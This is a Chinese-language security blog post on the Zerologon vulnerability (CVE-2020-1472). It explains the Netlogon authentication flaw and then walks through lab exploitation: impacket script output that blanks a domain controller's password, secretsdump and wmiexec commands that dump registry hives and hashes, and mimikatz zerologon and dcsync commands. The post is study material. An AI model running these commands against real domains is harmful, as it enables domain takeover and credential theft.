<!DOCTYPE html><html lang="en" mode="light" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="pv-cache-enabled" content="false"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="Zerologon CVE-2020-1472 原理及利用" /><meta name="author" content="RingLcy" /><meta property="og:locale" content="en_US" /><meta name="description" content="Zerologon CVE-2020-1472 原理及利用" /><meta property="og:description" content="Zerologon CVE-2020-1472 原理及利用" /><link rel="canonical" href="https://ringlcy.github.io/posts/ZeroLogon%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/" /><meta property="og:url" content="https://ringlcy.github.io/posts/ZeroLogon%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/" /><meta property="og:site_name" content="我的学习笔记" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-12-31T23:59:52+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Zerologon CVE-2020-1472 原理及利用" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"RingLcy"},"description":"Zerologon CVE-2020-1472 原理及利用","url":"https://ringlcy.github.io/posts/ZeroLogon%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/","@type":"BlogPosting","headline":"Zerologon CVE-2020-1472 原理及利用","dateModified":"2020-12-31T23:59:52+08:00","datePublished":"2020-12-31T23:59:52+08:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://ringlcy.github.io/posts/ZeroLogon%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/"},"@context":"https://schema.org"}</script><title>Zerologon CVE-2020-1472 原理及利用 | 我的学习笔记</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/favicons/ms-icon-144x144.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">我的学习笔记</a></div><div class="site-subtitle font-italic">种一棵树最好的时间是五年前，其次是现在</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/tabs/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tabs/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/tabs/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/tabs/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/RingLcy" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['',''].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Zerologon CVE-2020-1472 原理及利用</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Zerologon CVE-2020-1472 原理及利用</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Thu, Dec 31, 2020, 11:59 PM +0800" > Dec 31, 2020 <i class="unloaded">2020-12-31T23:59:52+08:00</i> </span> by <span class="author"> RingLcy </span></div><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1619 words">8 min</span></div></div><div class="post-content"><h1 id="zerologon-cve-2020-1472-原理及利用">Zerologon CVE-2020-1472 原理及利用</h1><h2 id="0x00-前言">0x00 前言</h2><hr /><p><strong>参考</strong></p><p>https://www.secura.com/uploads/whitepapers/Zerologon.pdf</p><p>https://threadreaderapp.com/thread/1306280553281449985.html</p><h2 id="0x01--netlogon-remote-protocol">0x01 Netlogon Remote Protocol</h2><hr /><p>Netlogon是windows域主机上的一个服务，用于维护计算机和域控制器之间的安全通道，对用户和服务进行身份验证。服务描述如下：</p><blockquote><p>Maintains a secure channel between this computer and the domain controller for authenticating users and services. If this service is stopped, the computer may not authenticate users and services and the domain controller cannot register DNS records. If this service is disabled, any services that explicitly depend on it will fail to start.</p></blockquote><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/image-20201218152529618.png" alt="image-20201218152529618" /></p><p>Netlogon服务提供了一组RPC接口，它有自己的一套认证方式，并不使用NTLM认证、Kerberos认证。至于什么具体场景会用到Netlogon协议，还没有研究过。</p><blockquote><p>Specifies the Netlogon Remote Protocol, an RPC interface that is used for user and machine authentication on domain-based networks; to replicate the user account database for operating systems earlier than Windows 2000 backup domain controllers; to maintain domain relationships from the members of a domain to the domain controller, among domain controllers for a domain, and between domain controllers across domains; and to discover and manage these relationships.</p></blockquote><p>类似DRS服务，其对应SPN是E3514235-4B06-11D1-AB04-00C04FC2DCD2，那既然Netlogon也是域内主机上的一个服务，它对应的SPN是什么？通过<a href="https://adsecurity.org/?page_id=183">查询</a>，AD会自动将一些常见的服务映射为Host SPN。每个加入域的主机都有一个SPN，叫做Host SPN。Host SPN对应的SPN列表，可以在<code class="language-plaintext highlighter-rouge">CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration</code>中的<code class="language-plaintext highlighter-rouge">sPNMappings</code>中查到。</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/image-20201218161434120.png" alt="image-20201218161434120" /></p><h2 id="0x02-netlogn协议认证">0x02 Netlogn协议认证</h2><blockquote><p>A Netlogon session is initiated by the client, whereby client and server exchange random 8-byte nonces (called client and server challenges) with each other. They both compute a session key by mixing both challenges with the shared secret using a key derivation function. Then the client uses this session key to compute a client credential. The server recomputes this same credential value and if it matches it is concluded that the client must know the session key, and therefore the client must also know the computer password.</p><p>During the authentication handshake both parties can negotiate whether they want to seal and sign (encrypt and cryptographically authenticate) subsequent messages, which is essential to protect against network-level attackers. When encryption is disabled, all Netlogon calls that perform an important action must still contain an authenticator value that is also computed using the session key.</p></blockquote><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/image-20201220132745504.png" alt="image-20201220132745504" /></p><p>Client Credential是由client调用<code class="language-plaintext highlighter-rouge">ComputeNetlogonCredential</code>得出的，它使用的是AES-CFB8算法：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/image-20201220134348283.png" alt="image-20201220134348283" /></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/image-20201220135408656.png" alt="image-20201220135408656" /></p><h2 id="0x03-zerologon利用原理">0x03 Zerologon利用原理</h2><h3 id="exploit-step-1-spoofing-the-client-credential">Exploit step 1: spoofing the client credential</h3><p>设置client challenge和client credential为8字节0，如果调用<code class="language-plaintext highlighter-rouge">NetrServerAuthenticate3</code>可以通过认证，说明成功碰到满足调节的Session Key。计算机帐户在无效登录后没有锁定，我们可以简单地尝试很多次，直到我们击中这样的密钥并身份验证成功。</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/image-20201220140117347.png" alt="image-20201220140117347" /></p><p><strong><em>注：</em></strong></p><p>一般都是伪装为DC$，这样就有足够的权限做DCSync。</p><p>如果想伪装成其他<code class="language-plaintext highlighter-rouge">machine$</code>, <code class="language-plaintext highlighter-rouge">dc_ip</code>还是DC的IP，用于连接RPC Server；<code class="language-plaintext highlighter-rouge">target_computer</code>要改成其他machine；<code class="language-plaintext highlighter-rouge">NETLOGON_SECURE_CHANNEL_TYPE</code>要设置为<code class="language-plaintext highlighter-rouge">WorkstationSecureChannel: A secure channel from a domain member to a DC.</code>。已测试过有效，可以将其他machine$密码置空</p><h3 id="exploit-step-2-disabling-signing-and-sealing">Exploit step 2: disabling signing and sealing</h3><p>signing and sealing 会对后续的通信过程加密及认证，我们需要在<code class="language-plaintext highlighter-rouge">NetrServerAuthenticate3</code>时通过flag关闭它。</p><p>默认情况下，当服务器没有设置此标志时，客户端将拒绝连接（可能是防止降级攻击的措施），但服务器不会拒绝不请求加密的客户端。Zerologon的patch，就是通过强制signing and sealing来阻断这个利用过程的。</p><h3 id="exploit-step-3-spoofing-a-call">Exploit step 3: spoofing a call</h3><blockquote><p>Even when call encryption is disabled, every call that does something interesting must contain a so-called authenticator value. This value is computed by applying ComputeNetlogonCredential (with the session key) to the value ClientStoredCredential + Timestamp.</p></blockquote><blockquote><p>ClientStoredCredential is an incrementing value maintained by the client. When performing the handshake, it is intialised to the same value as the ClientCredential we provided. This client credential consists solely of zeroes, so ClientStoredCredential will be 0 for the first call performed after authentication.</p></blockquote><blockquote><p>Timestamp should contain the current Posix time, and is included in the call by the client along with the authenticator. It turns out, however, that the server does not actually place many restrictions on what this value can be (which makes sense, otherwise clock skew would become very troublesome), so we can simply pretend that it’s January 1st, 1970 and also set this value to 0.</p></blockquote><p>signing and sealing后，后续过程调用仍要提供一个authenticator，它的计算就简单多了，直接client credential递增以及提供时间戳即可。有了authendicator，就可以调用Netlogon RPC方法了。</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/image-20201220142119479.png" alt="image-20201220142119479" /></p><h3 id="exploit-step-4-changing-a-computers-ad-password">Exploit step 4: changing a computer’s AD password</h3><p>[MS-NRPC]有很多与数据复制有关的方法，但自从引入Active Directory后就禁用了；<code class="language-plaintext highlighter-rouge"> NetrServerPasswordGet</code>可以获取账户密码Hash，但Hash需要Session Key解密。最终，作者使用了<code class="language-plaintext highlighter-rouge">NetrServerPasswordSet2 </code>方法设置DC密码为空，再滥用DC$账户的高权限。</p><p><code class="language-plaintext highlighter-rouge">NetrServerPasswordSet2 </code>的参数<code class="language-plaintext highlighter-rouge">ClearNewPassword</code>代表要设置的新密码，它是一个516 bytes数据，最后4 bytes表示密码的长度。设置<code class="language-plaintext highlighter-rouge">ClearNewPassword</code>为516字节0，从而将机器账户密码设置为空。</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/image-20201220143300755.png" alt="image-20201220143300755" /></p><h3 id="exploit-step-5-from-password-change-to-domain-admin">Exploit step 5: from password change to domain admin</h3><p>使用空密码远程登陆DC，进行DCSync等后续操作。</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/image-20201220143854296.png" alt="image-20201220143854296" /></p><h3 id="影响">影响</h3><p>Zerologon只是将AD中的密码置空，但Server机器SAM注册表中仍存储着原始的密码，从而导致Server机器与AD的信任关系被破坏，服务不可用。可以再次利用Zerologon，设置机器账户密码为原始值，恢复环境。</p><p>DC$被置空，ZeroLogon作者发现DNS服务受影响。</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/EiDOWI3XkAEJM2K.jpg" alt="Image" /></p><p>其他域主机密码被置空，会无法登录该主机，提示 <code class="language-plaintext highlighter-rouge">The trust relationship between this workstation and the primary domain failed</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/EiDMoJMXkAAb-dI.jpg" alt="Image" /></p><h3 id="0x04-利用">0x04 利用</h3><h3 id="1-impacket">1. impacket</h3><p>https://github.com/risksense/zerologon/</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre>C:\Users\win10\Desktop\zerologon&gt;python set_empty_pw.py ringdc-pc 192.168.240.142
Performing authentication attempts...
==================================================================================================================
NetrServerAuthenticate3Response
ServerCredential:
    Data:                            b'\x10\x1e\x7f\xc6\xb3\xa4$\x87'
NegotiateFlags:                  556793855
AccountRid:                      1000
ErrorCode:                       0


server challenge b'\x10\x9f\x8f\xf7\xe5\xf2\x876'
NetrServerPasswordSet2Response
ReturnAuthenticator:
    Credential:
        Data:                            b'\x01\xf7m\x03\x18\x11\xc7\xb6'
    Timestamp:                       0
ErrorCode:                       0



Success! DC should now have the empty string as its machine password.
</pre></table></code></div></div><p><a href="https://github.com/RingLcy/BlogStorage/tree/main/traffic/zerologo_impacket.pcapng">zerologo_impacket.pcapng</a></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/image-20201220154626164.png" alt="image-20201220154626164" /></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 ring2/ringdc-pc$@192.168.240.142
secretsdump.py -no-pass -just-dc ring2.com/ringdc-pc$@192.168.240.142

</pre></table></code></div></div><p><strong>清理环境</strong></p><p>SAM注册表里存的是用户账户HASH, SYSTEM注册表里存的是机器账户HASH, 两者都需要SECURITY注册表中的bootKey解密</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre>&gt; wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe ad.test.com/Administrator@192.168.209.129
- reg save HKLM\SYSTEM system.save
- reg save HKLM\SAM sam.save
- reg save HKLM\SECURITY security.save
- get system.save
- get sam.save
- get security.save
- del /f system.save
- del /f sam.save
- del /f security.save

&gt; secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
&gt; reinstall_original_pw.py ringdc-pc 192.168.240.142 1ed14f438a76ab48b513b466d875734d
</pre></table></code></div></div><p>注意，执行<code class="language-plaintext highlighter-rouge">reinstall_original_pw.py</code>要确保密码已被置空，用空密码算出来的SessionKey加密NTLM Hash，DC用同样的SessionKey解码，才能赋值正确。</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/image-20201220161905098.png" alt="image-20201220161905098" /></p><h3 id="2-mimikatz">2. mimikatz</h3><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>lsadump::zerologon /target:ring2.com /account:ringdc-pc$ /exploit
lsadump::dcsync /authuser:ringdc-pc$ /authpassword:"" /user:administrator /csv
</pre></table></code></div></div><p>最新版mimikatz对流量加密了，看不到各函数调用 <a href="https://github.com/RingLcy/BlogStorage/tree/main/traffic/zerologon_mimikatz_encrypt.pcapng">zerologon_mimikatz_encrypt.pcapng</a></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/image-20201220165811271.png" alt="image-20201220165811271" /></p><p><strong>恢复环境(并未恢复至原始HASH)</strong></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>privilege::debug
sekurlsa::pth /user:administrator /domain:ring2.com /ntlm:b9e0cfceaf6d077970306a2fd88a7c0a
lsadump::postzerologon /target:192.168.240.142 /account:ringdc-pc$
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/image-20201220165402426.png" alt="image-20201220165402426" /></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/%E5%9F%9F%E5%AE%89%E5%85%A8/'>域安全</a>, <a href='/categories/ta0004%E6%9D%83%E9%99%90%E5%8D%87%E7%BA%A7/'>TA0004权限升级</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/zerologon/" class="post-tag no-text-decoration" >Zerologon</a> <a href="/tags/ta0004%E6%9D%83%E9%99%90%E5%8D%87%E7%BA%A7/" class="post-tag no-text-decoration" >TA0004权限升级</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Zerologon CVE-2020-1472 原理及利用 - 我的学习笔记&url=https://ringlcy.github.io/posts/ZeroLogon%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Zerologon CVE-2020-1472 原理及利用 - 我的学习笔记&u=https://ringlcy.github.io/posts/ZeroLogon%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Zerologon CVE-2020-1472 原理及利用 - 我的学习笔记&url=https://ringlcy.github.io/posts/ZeroLogon%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ta0006%E5%87%AD%E6%8D%AE%E8%AE%BF%E9%97%AE/">TA0006凭据访问</a> <a class="post-tag" href="/tags/ta0003%E6%8C%81%E4%B9%85%E5%8C%96/">TA0003持久化</a> <a class="post-tag" href="/tags/mimikatz/">mimikatz</a> <a class="post-tag" href="/tags/ta0004%E6%9D%83%E9%99%90%E5%8D%87%E7%BA%A7/">TA0004权限升级</a> <a class="post-tag" href="/tags/ta0008%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/">TA0008横向移动</a> <a class="post-tag" href="/tags/activedirectory/">ActiveDirectory</a> <a class="post-tag" href="/tags/adminsdholder/">AdminSDHolder</a> <a class="post-tag" href="/tags/as-rep-roasting/">AS-REP Roasting</a> <a class="post-tag" href="/tags/dcshadow/">DCShadow</a> <a class="post-tag" href="/tags/dcsync/">dcsync</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/DNSAdmin/"><div class="card-body"> <span class="timeago small" > Dec 31, 2020 <i class="unloaded">2020-12-31T23:59:55+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>DNSAdmin</h3><div class="text-muted small"><p> 0x00 简介 感染DNSAdmin组用户，为DNS服务配置恶意ServerLevelPluginDll，DNS服务会以system权限加载该Dll，从而达到提权目的。 参考： https://github.com/kazkansouh/DNSAdmin-DLL Feature, not bug: DNSAdmin to DC compromise in one line Abus...</p></div></div></a></div><div class="card"> <a href="/posts/%E5%88%A9%E7%94%A8cachedGroupPolicySettings%E5%85%B3%E9%97%ADScriptBlockLogging/"><div class="card-body"> <span class="timeago small" > Dec 31, 2020 <i class="unloaded">2020-12-31T23:59:55+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>利用cachedGroupPolicySettings关闭ScriptBlockLogging</h3><div class="text-muted small"><p> 参考： PowerShell ScriptBlock Logging Bypass In Windows 10 / PowerShell 5.0, Microsoft introduced several new security features in PowerShell. These included the AMSI, Protected Event Logging, and m...</p></div></div></a></div><div class="card"> <a href="/posts/Kerberoasting/"><div class="card-body"> <span class="timeago small" > Dec 31, 2020 <i class="unloaded">2020-12-31T23:59:56+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Kerberoasting</h3><div class="text-muted small"><p> Kerberoasting SPN(Service Principal Name) SPN，即Service Principal Name，客户端通过Kerberos请求使用某种服务时，会在请求中附带上需要访问的服务的SPN名称，如文件共享服务cifs/DNS_DOMAIN_NAME，目录访问服务ldap/DNS_DOMAIN_NAME。KDC（密钥分发中心）将通过SPN来确定客户端请求...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/NTLM%E8%AE%A4%E8%AF%81%E4%B8%8E%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92/" class="btn btn-outline-primary" prompt="Older"><p>NTLM认证与利用</p></a> <a href="/posts/RID-Hijacking/" class="btn btn-outline-primary" prompt="Newer"><p>RID Hijacking</p></a></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('.post-content img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2021 <a href=""></a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/ta0006%E5%87%AD%E6%8D%AE%E8%AE%BF%E9%97%AE/">TA0006凭据访问</a> <a class="post-tag" href="/tags/ta0003%E6%8C%81%E4%B9%85%E5%8C%96/">TA0003持久化</a> <a class="post-tag" href="/tags/mimikatz/">mimikatz</a> <a class="post-tag" href="/tags/ta0004%E6%9D%83%E9%99%90%E5%8D%87%E7%BA%A7/">TA0004权限升级</a> <a class="post-tag" href="/tags/ta0008%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/">TA0008横向移动</a> <a class="post-tag" href="/tags/activedirectory/">ActiveDirectory</a> <a class="post-tag" href="/tags/adminsdholder/">AdminSDHolder</a> <a class="post-tag" href="/tags/as-rep-roasting/">AS REP Roasting</a> <a class="post-tag" href="/tags/dcshadow/">DCShadow</a> <a class="post-tag" href="/tags/dcsync/">dcsync</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://ringlcy.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag 